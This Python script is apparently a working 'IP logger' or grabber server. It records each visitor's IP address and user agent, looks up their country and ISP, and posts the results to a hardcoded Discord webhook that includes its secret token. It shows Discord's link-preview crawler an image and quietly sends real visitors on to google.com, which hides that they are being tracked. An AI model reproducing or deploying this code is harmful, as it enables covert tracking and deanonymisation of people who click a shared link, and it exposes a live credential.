from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import requests, json

# Discord Webhook for logging
WEBHOOK_URL = "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS"

class IPLoggerHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            # Get client IP
            client_ip = self.headers.get('X-Forwarded-For', '').split(',')[0] or \
                       self.headers.get('X-Real-IP') or \
                       self.client_address[0]
            
            # Get user agent
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Check if it's Discord's crawler
            is_discord_bot = 'Discordbot' in user_agent
            
            # Get more IP info
            ip_info = {}
            try:
                ip_info = requests.get(f'http://ip-api.com/json/{client_ip}').json()
            except:
                pass
            
            # Prepare the embed message
            embed = {
                "username": "IP Logger",
                "embeds": [{
                    "title": "🔍 IP Logged" if not is_discord_bot else "🤖 Discord Preview",
                    "color": 0x00ff00 if not is_discord_bot else 0xff0000,
                    "fields": [
                        {"name": "IP Address", "value": f"`{client_ip}`", "inline": True},
                        {"name": "Country", "value": ip_info.get('country', 'Unknown'), "inline": True},
                        {"name": "ISP", "value": ip_info.get('isp', 'Unknown'), "inline": True},
                        {"name": "User Agent", "value": f"```{user_agent[:500]}```", "inline": False},
                        {"name": "Platform", "value": "Discord Bot" if is_discord_bot else "Real User", "inline": True}
                    ],
                    "footer": {"text": "Auto IP Logger Test"}
                }]
            }
            
            # Send to Discord webhook
            requests.post(WEBHOOK_URL, json=embed)
            
            # Serve different content based on who's requesting
            if is_discord_bot:
                # Serve a simple image for Discord preview
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                # You can serve an actual image here or just headers
            else:
                # For real users, serve a redirect or image
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')  # Redirect somewhere
                self.end_headers()
                
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Disable default logging

def run_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), IPLoggerHandler)
    print(f"IP Logger running on port {port}")
    print(f"Test URL: http://your-server.com:{port}/")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
